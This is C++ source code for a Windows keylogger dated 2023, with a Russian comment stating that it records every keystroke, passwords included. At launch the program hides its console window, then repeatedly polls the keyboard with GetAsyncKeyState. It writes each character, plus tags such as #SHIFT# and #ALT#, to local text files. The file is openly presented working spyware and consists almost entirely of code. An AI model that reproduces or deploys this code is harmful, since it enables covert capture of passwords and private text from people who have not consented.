/*++

    KeyLogger
    Copyright (c) S-Patriarch, 2023

    Кейлоггер - это приложение, которое записывает в файл все нажатия
    клавиш, которые производит пользователь. Кейлоггер пишет все, в
    том числе и пароли, которые вводит пользователь.

    После запуска кейлоггер прячет свое окно посредством
    следующего вызова:
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    Далее он получает код каждой нажатой клавиши и записывает символ
    клавиши в файл. Для обработки специальных клавиш используется
    функция SpecialKey(), возвращающая обозначение для клавиши,
    например, #SHIFT#, #ALT# и т.д.

--*/

#define _WIN32_WINNT 0x0500

#include <Windows.h>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <iostream>
#include <fstream>

//--------------------------------------------------------------------
void LOG(std::string _input)
{
    std::fstream LogFile;
    LogFile.open("data.txt", std::fstream::app);

    if (LogFile.is_open()) {
        LogFile << _input;
        LogFile.close();
    }
}

//--------------------------------------------------------------------
bool SpecialKey(int S_Key)
{
    switch (S_Key) {
        case VK_SPACE:
            std::cout << " ";
            ::LOG(" ");
            return true;

        case VK_RETURN:
            std::cout << "\n";
            ::LOG("\n");
            return true;

        case VK_SHIFT:
            std::cout << "#SHIFT#";
            ::LOG("#SHIFT#");
            return true;

        case VK_BACK:
            std::cout << "\b";
            ::LOG("\b");
            return true;

        case VK_RBUTTON:
            std::cout << "#R_CLICK#";
            ::LOG("#R_CLICK#");
            return true;

        case VK_CAPITAL:
            std::cout << "#CAPS_LOCK#";
            ::LOG("#CAPS_LOCK#");
            return true;

        case VK_TAB:
            std::cout << "#TAB#";
            ::LOG("#TAB#");
            return true;

        case VK_UP:
            std::cout << "#UP#";
            ::LOG("#UP_ARROW_KEY#");
            return true;

        case VK_DOWN:
            std::cout << "#DOWN#";
            ::LOG("#DOWN_ARROW_KEY#");
            return true;

        case VK_LEFT:
            std::cout << "#LEFT#";
            ::LOG("#LEFT_ARROW_KEY#");
            return true;

        case VK_RIGHT:
            std::cout << "#RIGNT#";
            ::LOG("#RIGNT_ARROW_KEY#");
            return true;

        case VK_CONTROL:
            std::cout << "#CONTROL#";
            ::LOG("#CONTROL#");
            return true;

        case VK_MENU:
            std::cout << "#ALT#";
            ::LOG("#ALT#");
            return true;

        default:
            return false;
    }
}

//////////////////////////////////////////////////////////////////////
int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';

    while (true) {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (SpecialKey(KEY) == false) {
                    std::fstream LogFile;
                    LogFile.open("dat.txt", std::fstream::app);
                    if (LogFile.is_open()) {
                        LogFile << char(KEY);
                        LogFile.close();
                    }
                }
            }
        }
    }

    return 0;
}
